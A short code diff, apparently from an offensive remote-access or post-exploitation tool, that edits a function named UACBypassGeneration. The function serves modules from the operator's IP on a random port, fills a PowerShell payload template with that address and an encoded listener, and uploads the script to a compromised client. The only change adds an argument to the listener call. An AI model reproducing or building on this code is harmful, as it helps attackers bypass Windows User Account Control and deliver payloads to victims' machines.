@@ -153,7 +153,7 @@ def UACBypassGeneration(payloadchoice,payloadname):
     from menu import returnIP
     moduleport = FUNCTIONS().randomUnusedPort()
     FUNCTIONS().DoServe(returnIP(), "", "./externalmodules", port = moduleport, printIt = False)
-    encoded = printListener(False)
+    encoded = printListener(False, True)
     powershellScript = payloadchoice % (returnIP(), moduleport, encoded)
     clientnumber = int(clientUpload(payloadname,powershellScript,isExe=False,json='{"type":"script", "data":"%s", "sendoutput":"false", "multiple":"false"}'))
 
